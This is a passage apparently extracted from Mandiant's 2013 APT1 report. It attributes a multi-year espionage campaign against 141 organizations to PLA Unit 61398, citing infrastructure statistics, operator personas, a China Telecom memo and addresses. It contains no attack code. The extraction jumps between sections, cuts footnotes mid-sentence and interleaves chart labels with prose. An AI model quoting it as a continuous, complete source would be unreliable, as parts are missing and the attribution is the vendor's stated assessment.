We first published details about the APT in our January 2010 M-Trends report. As we stated in the](https://www.mandiant.com/resources/m-trends/)\nreport, our position was that “The Chinese government may authorize this activity, but there’s no way to determine the\nextent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details\nwe have analyzed during hundreds of investigations convince us that the groups conducting these activities are based\nprimarily in China and that the Chinese Government is aware of them.[3]\n\nMandiant continues to track dozens of APT groups around the world; however, this report is focused on the most\nprolific of these groups. We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in\nChina. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad\nrange of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in\nterms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this\nreport.\n\nThe activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has\nconducted. Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against\nnearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back\nto four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a\nsubstantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and\nprocedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three\npersonas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by\nothers.\n\nOur analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China’s\ncyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign\nin large part because it receives direct government support. In seeking to identify the organization behind this activity,\nour research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and\nresources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.\n\n3 Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations. None of the information in\nthis report involves access to or confirmation by classified intelligence.\n\n\n-----\n\n###### KEY FINDINGS\n\n APT1 is believed to be the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department (总参三部二局), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398部队).\n\n»» The nature of “Unit 61398’s” work is considered by China to be a state secret; however, we believe it engages in\nharmful “Computer Network Operations.”\n\n»» Unit 61398 is partially situated on Datong Road (大同路) in Gaoqiaozhen (高桥镇), which is located in the Pudong\nNew Area (浦东新区) of Shanghai (上海). The central building in this compound is a 130,663 square foot facility\nthat is 12 stories high and was built in early 2007.\n\n»» We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit\n61398’s physical infrastructure.\n\n»» China Telecom provided special fiber optic communications infrastructure for the unit in the name of national\ndefense.\n\n»» Unit 61398 requires its personnel to be trained in computer security and computer network operations and also\nrequires its personnel to be proficient in the English language.\n\n»» Mandiant has traced APT1’s activity to four large networks in Shanghai, two of which serve the Pudong New Area\nwhere Unit 61398 is based.\n\n###### APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously.[4]\n\n»» Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.\n\n»» APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable\nintellectual property.\n\n»» Once APT1 has established access, they periodically revisit the victim’s network over several months or years\nand steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing\nprocesses, test results, business plans, pricing documents, partnership agreements, and emails and contact lists\nfrom victim organizations’ leadership.\n\n»» APT1 uses some tools and techniques that we have not yet observed being used by other groups including two\nutilities designed to steal email — GETMAIL and MAPIGET.\n\n»» APT1 maintained access to victim networks for an average of 356 days.[5] The longest time period APT1 maintained\naccess to a victim’s network was 1,764 days, or four years and ten months.\n\n»» Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of\ncompressed data from a single organization over a ten-month time period.\n\n»» In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different\nindustries.\n\n4 We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted.\nTherefore, Mandiant is establishing the lower bounds of APT1 activities in this report.\n\n5 This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into\nthe last known date of APT1 activity in the network.\n\n\n-----\n\n###### APT1 focuses on compromising organizations across a broad range of industries in English-speaking countries.\n\n»» Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language.\n\n»» The industries APT1 targets match industries that China has identified as strategic to their growth, including four of\nthe seven strategic emerging industries that China identified in its 12th Five Year Plan.\n\n###### APT1 maintains an extensive infrastructure of computer systems around the world.\n\n»» APT1 controls thousands of systems in support of their computer intrusion activities.\n\n»» In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers\nhosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were\nregistered to organizations in China (709), followed by the U.S. (109).\n\n»» In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique\nIP addresses.\n\n»» Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into\ntheir attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user\nwith an interactive graphical interface to a system.\n\n»» In the last several years we have confirmed 2,551 FQDNs attributed to APT1.\n\n###### In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simplified Chinese language.\n\n»» In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1\noperator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”. Microsoft’s Remote Desktop client\nconfigures this setting automatically based on the selected language on the client system. Therefore, the APT1\nattackers likely have their Microsoft[®] operating system configured to display Simplified Chinese fonts.\n\n»» 817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to\nChina.\n\n»» We observed 767 separate instances in which APT1 intruders used the “HUC Packet Transmit Tool” or HTRAN\nto communicate between 614 distinct routable IP addresses and their victims’ systems using their attack\ninfrastructure. Of the 614 distinct IP addresses used for HTRAN communications:\n\n−− 614 of 614 (100%) were registered in China.\n\n−− 613 (99.8%) were registered to one of four Shanghai net blocks.\n\n\n-----\n\n###### The size of APT1’s infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators.\n\n»» We conservatively estimate that APT1’s current attack infrastructure includes over 1,000 servers.\n\n»» Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly\nsupported by linguists, open source researchers, malware authors, industry experts who translate task requests\nfrom requestors to the operators, and people who then transmit stolen information to the requestors.\n\n»» APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who\nhandle finances, facility management, and logistics (e.g., shipping).\n\n###### In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with APT1 activity.\n\n»» The first persona, “UglyGorilla”, has been active in computer network operations since October 2004. His activities\ninclude registering domains attributed to APT1 and authoring malware used in APT1 campaigns. “UglyGorilla”\npublicly expressed his interest in China’s “cyber troops” in January 2004.\n\n»» The second persona, an actor we call “DOTA”, has registered dozens of email accounts used to conduct social\nengineering and spear phishing attacks in support of APT1 campaigns. “DOTA” used a Shanghai phone number\nwhile registering these accounts.\n\n»» We have observed both the “UglyGorilla” persona and the “DOTA” persona using the same shared infrastructure,\nincluding FQDNs and IP ranges that we have attributed to APT1.\n\n»» The third persona, who uses the nickname “SuperHard,” is the creator or a significant contributor to the AURIGA\nand BANGAT malware families which we have observed APT1 and other APT groups use. “SuperHard” discloses\nhis location to be the Pudong New Area of Shanghai.\n\n###### Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations.\n\n»» Specifically, Mandiant is providing the following:\n\n−− Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of\nmalware.\n\n−− Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1’s\narsenal of digital weapons.\n\n−− Thirteen (13) X.509 encryption certificates used by APT1.\n\n−− A compilation of videos showing actual attacker sessions and their intrusion activities.\n\n»» [While existing customers of Mandiant’s enterprise-level products, Mandiant Managed Defense and Mandiant](http://www.mandiant.com/products/mcirt-managed-defense/)\n[Intelligent Response[®], have had prior access to these APT1 Indicators, we are also making them available for use](http://www.mandiant.com/products/platform/)\n[with Redline™, our free host-based investigative tool. Redline can be downloaded at http://www.mandiant.com/](http://www.mandiant.com/resources/download/redline)\n[resources/download/redline.](http://www.mandiant.com/resources/download/redline)\n\n\n-----\n\n###### Conclusion\n\nThe sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified\ngroup based in China leaves little doubt about the organization behind APT1. We believe the totality of the evidence\nwe provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely\npossibility:\n\nA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based\ntelecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign\nright outside of Unit 61398’s gates, performing tasks similar to Unit 61398’s known mission.\n\n###### Why We Are Exposing APT1\n\nThe decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as\na “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive\nimpact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this\nparticular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm\nand prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing\nlink in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China,\nthere will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral\nto larger national security and global economic concerns. We hope that this report will lead to increased understanding\nand coordinated action in countering APT network breaches.\n\nAt the same time, there are downsides to publishing all of this information publicly. Many of the techniques and\ntechnologies described in this report are vastly more effective when attackers are not aware of them. Additionally,\npublishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques\nafter reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It\nis our sincere hope, however, that this report can temporarily increase the costs of Unit 61398’s operations and impede\ntheir progress in a meaningful way.\n\nWe are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of\ncriticism.\n\n\n-----\n\n##### China’s Computer Network Operations Tasking to PLA Unit 61398 (61398部队)\n\nOur research and observations indicate that the Communist Party of\nChina (CPC,中国共产党) is tasking the Chinese People’s Liberation Army\n(PLA,中国人民解放军) to commit systematic cyber espionage and data theft\nagainst organizations around the world. This section provides photos and details\nof Unit 61398 facilities, Chinese references discussing the unit’s training and\ncoursework requirements, and internal Chinese communications documenting\nthe nature of the unit’s relationship with at least one state-owned enterprise.\nThese details will be particularly relevant when we discuss APT1’s expertise,\npersonnel, location, and infrastructure, which parallel those of Unit 61398.\n\n###### The Communist Party of China\n\nThe PLA’s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China’s state-\nowned enterprises to support its operations. The CPC is the ultimate authority in Mainland China; unlike in Western\nsocieties, in which political parties are subordinate to the government, the military and government in China are\nsubordinate to the CPC. In fact, the PLA reports directly to the CPC’s Central Military Commission (CMC, 中央军事委\n员会).[6] This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior\nmembers of the CPC.\n\nWe believe that the PLA’s strategic cyber command is situated in the PLA’s General Staff Department (GSD,总参谋\n部), specifically its 3rd Department (总参三部).[7] The GSD is the most senior PLA department. Similar to the U.S.\nJoint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA. Within the GSD, the\n3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information\n\n6 James C. Mulvenon and Andrew N. D.

The majority of the “profession codes” (专业代码)\ndescribing positions that Unit 61398 is seeking to fill require highly technical computer skills.

This is an extrapolation based on public disclosures from within China describing the location\nand physical installations associated with Unit 61398. For example, public sources confirm that in early 2007, Jiangsu\nLonghai Construction Engineering Group (江苏龙海建工集团有限公司) completed work on a new building for Unit\n61398 located at Datong Road 208 within the Pudong New Area of Shanghai (上海市浦东新区高桥镇大同路208号),[21]\nwhich is referred to as the “Unit 61398 Center Building” (61398部队中心大楼). At 12 stories in height, and offering\n130,663 square feet of space, we estimate that this building houses offices for approximately 2,000 people. Figure 4\nthrough Figure 7 provide overhead views and street-level views of the building and its location, showing its size. This is\nonly one of the unit’s several buildings, some of which are even larger.\n\n20 Two Chinese universities hosting Unit 61398 recruiting events:\n\n[• Zhejiang University: http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021](http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021)\n\n[• Harbin Institute of Technology: http://today.hit.edu.cn/articles/2004/2-23/12619.htm](http://today.hit.edu.cn/articles/2004/2-23/12619.htm)\n\n21 See http://www.czzbb.net/czzb/YW_Info/YW_ZiGeYS/BaoMingInfo.aspx?YW_RowID=41726&BiaoDuanBH=CZS20091202901&enterprise_\nid=70362377-3 for documentation of the contract award to Jiangsu Langhai Construction Engineering Group for Unit 61398’s Center Building,\namong several other buildings; accessed February 5, 2013.\n\n\n-----\n\n**Figure 4: Datong circa 2006 (prior to Unit 61398 Center Building construction) Image Copyright 2013**\n**DigitalGlobe**\n\n\n-----\n\n**Figure 5: Datong Circa 2008 (Unit 61398 Center Building visible at 208 Datong) Image Copyright 2013**\n**DigitalGlobe**\n\n\n-----\n\n**Figure 6: Unit 61398 Center Building (main gate, soldiers visible) Image Copyright 2013 city8.com**\n\n\n-----\n\n**Figure 7: Unit 61398 Center Building 208 Datong (rear view, possible generator exhausts visible) Image**\n**Copyright 2013 city8.com**\n\n\n-----\n\nUnit 61398 also has a full assortment of support units and associated physical infrastructure, much of which is located\non a stretch of Datong Road (大同路) in Gaoqiaozhen (高桥镇), in the Pudong New Area (浦东新区) of Shanghai (上\n海).[22] These support units include a logistics support unit, outpatient clinic, and kindergarten, as well as guesthouses\nlocated both in Gaoqiaozhen and in other locations in Shanghai.[23] These amenities are usually associated with large\nmilitary units or units at higher echelons. The close proximity of these amenities supports the contention that Unit\n61398 occupies a high-level position in the PLA organizational hierarchy (see Figure 1: Unit 61398’s positions within\nthe PLA).[24]\n\n###### PLA Unit 61398 and State-Owned Enterprise China Telecom are Co-building Computer Network Operations Infrastructure\n\nMandiant found an internal China Telecom document online that provides details about the infrastructure provided\nto Unit 61398. The memo (in Figure 8) reveals China Telecom executives deciding to “co-build” with Unit 61398 to\njustify the use of their own inventory in the construction of fiber optic communication lines “based on the principle that\nnational defense construction is important.” The letter also appears to indicate that this is a special consideration being\nmade outside of China Telecom’s “normal renting method” for Unit 61398. Additionally, the memo clarifies the phrase\n“Unit 61398” with the comment “(GSD 3rd Department, 2nd Bureau).” The memo not only supports the identity\nof Unit 61398 as GSD’s 3rd Department 2nd Bureau, but also reveals the relationship between a “very important\ncommunication and control department” (Unit 61398) and a state-influenced enterprise.\n\n22 Confirmation of several other Unit 61398 support facilities along Datong Road:\nAddress: 上海市浦东新区大同路50号 (Pudong New Area, Shanghai, Datong Road 50)\nBuilding Name: 中国人民解放军第61398部队司令部 (People’s Liberation Army Unit 61398 Headquarters)\nSource: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6\n%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B% E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%B-\nB%A4%E9%83%A8, accessed February 6, 2013.\n\nAddress: 上海市浦东新区大同路118弄甲 (Pudong New Area, Shanghai, Datong Road 118 A)\nBuilding Name: 中国人民解放军第61398部队司令部 (People’s Liberation Army Unit 61398 Headquarters)\nChinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%\n91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0,\naccessed February 6, 2013.\n\nAddress: 上海市浦东新区高桥镇大同路135号 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 135)\nBuilding Name: 中国人民解放军第61398部队 (People’s Liberation Army Unit 61398)\nChinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9\n1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed February 6, 2013.\n\nAddress: 上海市浦东新区高桥镇大同路153号 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 153)\nBuilding Name: 中国人民解放军第61398部队 (People’s Liberation Army Unit 61398)\nChinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9\n1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed February 6, 2013.\n\nAddress: 上海市浦东新区大同路305号 (Pudong New Area, Shanghai, Datong Road 305)\nBuilding Name: 中国人民解放军第61398部队后勤部 (Logistics Department of the Chinese People’s Liberation Army Unit 61,398)(\nChinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%B-\nB%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed\nFebruary 6, 2013.\n\n23 Unit 61398 Kindergarden Listed in Shanghai Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388\n\n24 James C.

This bureau already placed fiber-optic cable at the\nEast Gate front entrance [road pole]. They need to use two ports to enter our company’s\nEast Gate communication channel. The length is about 30m. At the same time, the second\nstage construction (in Gaoqiao Base) needs to enter into our company’s Shanghai Nanhui\nCommunication Park 005 Center (special-use bureau). This military fiber-optic cable has\nalready been placed at the Shanghai Nanhui Communication Park entrance. They need to use\n4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m.\nUpon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch,\nthe military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai\nTelecom will smoothly accomplish this task for the military based on the principle that national\ndefense construction is important. After checking the above areas’ channels, our company has a\nrelatively abundant inventory to satisfy the military’s request.\n\nThis is our suggestion: because this is concerning defense construction, and also the 3rd\nDepartment 2nd Bureau is a very important communication control department, we agree to\nprovide the requested channels according to the military’s suggested price. Because this is a\none-time payment, and it is difficult to use the normal renting method, we suggest our company\naccept one-time payment using the reason of “Military Co-Construction [with China Telecom] of\nCommunication Channels” and provide from our inventory. The military’s co-building does not\ninterfere with our proprietary rights. If something breaks, the military is responsible to repair it\nand pay for the expenses. After you agree with our suggestion, we will sign an agreement with\nthe communication branch of 61398 and implement it.\n\nPlease provide a statement about whether the above suggestion is appropriate or not.\n\n[Handwritten Note]Agree with the Market Department Examining Control Affairs Division\nsuggestion; inside the agreement clearly [...define?

The sheer scale and\nduration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this\ncampaign. We will demonstrate that the nature of APT1’s targeted victims and the group’s infrastructure and tactics\nalign with the mission and infrastructure of PLA Unit 61398.\n\n\n-----\n\n###### Organizations compromised\n by APT1 over time\n\n2006\n\n##### APT1: Years of\n\n2007\n\n##### Espionage\n\nOur evidence indicates that APT1 has been stealing hundreds of terabytes of\n\n2008 data from at least 141 organizations across a diverse set of industries beginning\n\nas early as 2006. Remarkably, we have witnessed APT1 target dozens of\norganizations simultaneously. Once the group establishes access to a victim’s\nnetwork, they continue to access it periodically over several months or years\nto steal large volumes of valuable intellectual property, including technology\nblueprints, proprietary manufacturing processes, test results, business plans,\npricing documents, partnership agreements, emails and contact lists from victim\n\n2009\n\norganizations’ leadership. We believe that the extensive activity we have directly\nobserved represents only a small fraction of the cyber espionage that APT1 has\ncommitted.\n\n###### APT1 Puts the “Persistent” in APT\n\n2010\n\nSince 2006 we have seen APT1 relentlessly expand its access to new victims.\nFigure 10 shows the timeline of the 141 compromises we are aware of; each\nmarker in the figure represents a separate victim and indicates the earliest\n_confirmed date of APT1 activity in that organization’s network.[26]_\n\nWith the ephemeral nature of electronic evidence, many of the dates of earliest\nknown APT1 activity shown here underestimate the duration of APT1’s presence in\n\n2011\n\nthe network.\n\n**Figure 10: Timeline showing dates of earliest known APT1 activity in the**\n**networks of the 141 organizations in which Mandiant has observed APT1**\n**conducting cyber espionage.**\n\n2012\n\n26 Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each\nyear, which may reflect an increase in APT1’s activity. However, this increase may also simply reflect\n\n2013 Mandiant’s expanding visibility into APT1’s activities as the company has grown and victims’ awareness\n\nof cyber espionage activity in their networks has improved.\n\n\n-----\n\nOnce APT1 has compromised a network, they repeatedly monitor and steal\n\n###### Longest time period within proprietary data and communications from the victim for months or even which APT1 has continued years. For the organizations in Figure 10, we found that APT1 maintained to access a victim’s network: access to the victim’s network for an average of 356 days.[27] The longest time\n\nperiod APT1 maintained access to a victim’s network was at least 1,764 days,\nor four years and ten months. APT1 was not continuously active on a daily\n\n###### 4 Years, 10 Months\n\nbasis during this time period; however, in the vast majority of cases we\nobserved, APT1 continued to commit data theft as long as they had access to\nthe network.\n\n###### APT1’s Geographic & Industry Focus\n\nThe organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the\ngroup target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are\nheadquartered in countries where English is the native language (see Figure 11). This includes 115 victims located\nin the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary\nlanguage for operations. These include international cooperation and development agencies, foreign governments\nin which English is one of multiple official languages, and multinational conglomerates that primarily conduct their\nbusiness in English. Only two victims appear to operate using a language other than English. Given that English-\nlanguage proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking\nvictims are anomalies representing instances in which APT1 performed tasks outside of their normal activities.\n\n27 This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility\ninto the last known date of APT1 activity in the network.\n\n\n-----\n\n|Col1|1|\n|---|---|\n\n\n**OBSERVED GLOBAL APT1 ACTIVITY**\n\n**1 Norway**\n\n**5 United Kingdom**\n\n**2 Canada**\n\n**1 Belgium**\n\n**1 Japan**\n\n**1 Luxemborg**\n\n**1 France**\n\n**3 Israel**\n\n**3 India**\n\n**2 Switzerland**\n\n**115 United States**\n\n**1 UAE** **2 Taiwan**\n\n**2 Singapore**\n\n**1 South Africa**\n\n**Figure 11: Geographic location of APT1’s victims. In the case of victims with a multinational presence, the**\n**location shown reflects either the branch of the organization that APT1 compromised (when known), or else is the**\n**location of the organization’s headquarters.**\n\nAPT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of\nindustries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of\nthe 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1’s\nmission is extremely broad; the group does not target industries systematically but more likely steals from an enormous\nrange of industries on a continuous basis. Since the organizations included in the figure represent only the fraction\nof APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our\nfindings suggest.\n\nFurther, the scope of APT1’s parallel activities implies that the group has significant personnel and technical resources\nat its disposal. In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17\nnew victims operating in 10 different industries. Since we have seen that the group remains active in each victim’s\nnetwork for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17\nnew breaches while simultaneously maintaining access to and continuing to steal data from a number of previously\ncompromised victims.\n\n\n-----\n\n###### TIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR\n\n2006 2007 2008 2009 2010 2011 2012\n\nInformation Technology\n\nTransportation\n\nHigh-Tech Electronics\n\nFinancial Services\n\nNavigation\n\nLegal Services\n\nEngineering Services\n\nMedia, Advertising and Entertainment\n\nFood and Agriculture\n\nSatellites and Telecommunications\n\nChemicals\n\nEnergy\n\nInternational Organizations\n\nScientific Research and Consulting\n\nPublic Administration\n\nConstruction and Manufacturing\n\nAerospace\n\nEducation\n\nHealthcare\n\nMetals and Mining\n\n**Figure 12: Timeframe of APT1’s cyber espionage operations against organizations by industry.

While we have certainly seen the group target some industries more\nheavily than others (see Figure 13), our observations confirm that APT1 has targeted at least four of the seven\nstrategic emerging industries that China identified in its 12th Five Year Plan.[28]\n\n0 5 10 15 20\n\nInformation Technology\n\nAerospace\n\nPublic Administration\n\nSatellites and Telecommunications\n\nScientific Research and Consulting\n\nEnergy\n\nTransportation\n\nConstruction and Manufacturing\n\nInternational Organizations\n\nEngineering Services\n\nHigh-tech Electronics\n\nLegal Services\n\nMedia, Advertising and Entertainment\n\nNavigation\n\nChemicals\n\nFinancial Services\n\nFood and Agriculture\n\nMetals and Mining\n\nHealthcare\n\nEducation\n\n0 5 10 15 20\n\n###### Industries Compromised by APT1\n\n**Figure 13: Number of APT1 victims by industry.

The types of information the group has stolen relate to:\n\n»» product development and use, including information on test results, system designs, product manuals, parts lists,\nand simulation technologies;\n\n»» manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management\nprocesses;\n\n»» business plans, such as information on contract negotiation positions and product pricing, legal events, mergers,\njoint ventures, and acquisitions;\n\n»» policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-\nranking personnel;\n\n»» emails of high-ranking employees; and\n\n»» user credentials and network architecture information.\n\nIt is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:\n\n»» APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually\noverwritten during normal business activities.\n\n»» Pre-existing network security monitoring rarely records or identifies the data theft.\n\n»» The duration of time between the data theft and Mandiant’s investigation is often too great, and the trace evidence\nof data theft is overwritten during the normal course of business.\n\n»» Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating\nand understanding the impact of the security breach.\n\nEven with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a\nsingle organization over a ten-month time period. Given the scope of APT1’s operations, including the number of\norganizations and industries we have seen them target, along with the volume of data they are clearly capable of\nstealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.\n\nAlthough we do not have direct evidence indicating who receives the information\n\n###### Largest APT1 data theft that APT1 steals or how the recipient processes such a vast volume of data, we from a single organization: do believe that this stolen information can be used to obvious advantage by the\n\nPRC and Chinese state-owned enterprises. As an example, in 2008, APT1\n\n###### 6.5 Terabytes compromised the network of a company involved in a wholesale industry. APT1\n\ninstalled tools to create compressed file archives and to extract emails and\nattachments. Over the following 2.5 years, APT1 stole an unknown number of\n\n###### over 10 months\n\nfiles from the victim and repeatedly accessed the email accounts of several\nexecutives, including the CEO and General Counsel. During this same time\nperiod, major news organizations reported that China had successfully\nnegotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This\nmay be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of\ncyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities\nable to capitalize on them.\n\n\n-----\n\n|Nickname|Verdict|\n|---|---|\n|Comment Crew|Confirmed APT1|\n|Comment Group|Confirmed APT1|\n|Shady Rat|Possibly APT1 (not confirmed)|\n|Nitro Attacks|Not APT1; Attributed to another tracked APT group|\n|Elderwood|Not APT1; Attributed to another tracked APT group|\n|Sykipot|Not APT1; Attributed to another tracked APT group|\n|Aurora|Not APT1; Attributed to another tracked APT group|\n|Night Dragon|Not APT1; Attributed to another tracked APT group|\n\n\n###### APT1 In The News\n\nPublic reporting corroborates and extends our observations of APT1’s cyber espionage activity. However, several factors\ncomplicate the process of compiling and synthesizing public reports on APT1. For one thing, information security\nresearchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on\nwriting about tools that are shared between multiple Chinese APT groups without differentiating between the various\nactors that use them.\n\nTo assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table\n3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that\ndescribe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we\nhave confirmed as referring to APT1.\n\n»» The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of\nSymantec.[30] The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as\nUgly Gorilla (discussed later in this report).\n\n»» In September 2012, Brian Krebs of the “Krebs on Security” cybercrime blog reported on a security breach at\nTelvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure\nthat the hackers used to exploit and gain access to the system.[31]\n\n**Table 3: Identifying APT1 Nicknames in the News**\n\n**Nickname** Verdict\n\n**Comment Crew** Confirmed APT1\n\n**Comment Group** Confirmed APT1\n\n**_Shady Rat_** _Possibly APT1 (not confirmed)_\n\n**Nitro Attacks** Not APT1; Attributed to another tracked APT group\n\n**Elderwood** Not APT1; Attributed to another tracked APT group\n\n**Sykipot** Not APT1; Attributed to another tracked APT group\n\n**Aurora** Not APT1; Attributed to another tracked APT group\n\n**Night Dragon** Not APT1; Attributed to another tracked APT group\n\n»» A SCADA security company by the name of Digital Bond published a report of spear phishing against its company\nin June 2012.[32] AlienVault provided analysis on the associated malware.[33] Indicators included in the report have\nbeen attributed as part of APT1 infrastructure.\n\n»» In November 2012, Bloomberg’s Chloe Whiteaker authored a piece on a Chinese threat group called “Comment\nGroup,” which described the various tools and domains used by APT1 persona Ugly Gorilla.[34]\n\n30 [Symantec, “Backdoor.Wualess,” Symantec Security Response (2007), http://www.symantec.com/ja/jp/security_response/print_writeup.](http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99)\n[jsp?docid=2006-101116-1723-99, accessed February 3, 2013.](http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99)\n\n31 [Brian Krebs, “Chinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,” Krebs on Security (2012) http://krebsonsecurity.](http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/)\n[com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed February 3, 